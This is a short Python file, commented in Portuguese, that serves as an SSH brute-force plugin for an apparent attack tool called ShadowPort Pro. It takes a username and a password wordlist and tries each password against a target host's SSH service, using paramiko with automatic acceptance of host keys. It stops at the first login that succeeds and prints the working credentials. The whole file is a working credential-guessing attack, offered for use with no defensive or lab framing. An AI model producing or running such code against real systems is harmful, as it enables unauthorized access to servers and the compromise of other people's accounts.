"""
Plugin de brute-force SSH para ShadowPort Pro (exemplo)
Uso: python ShadowPort.py exec -t alvo.com --plugin brute_ssh --plugin-args user wordlist.txt
"""
import paramiko

def run(target, options):
    if len(options) < 2:
        return "Uso: --plugin-args <usuario> <wordlist>"
    user = options[0]
    wordlist = options[1]
    try:
        with open(wordlist, 'r') as f:
            passwords = [line.strip() for line in f if line.strip()]
    except Exception as e:
        return f"Erro ao abrir wordlist: {e}"
    for pwd in passwords:
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(target, username=user, password=pwd, timeout=3)
            ssh.close()
            return f"SUCESSO: {user}@{target} com senha '{pwd}'"
        except paramiko.AuthenticationException:
            continue
        except Exception as e:
            return f"Erro: {e}"
    return "Nenhuma senha válida encontrada." 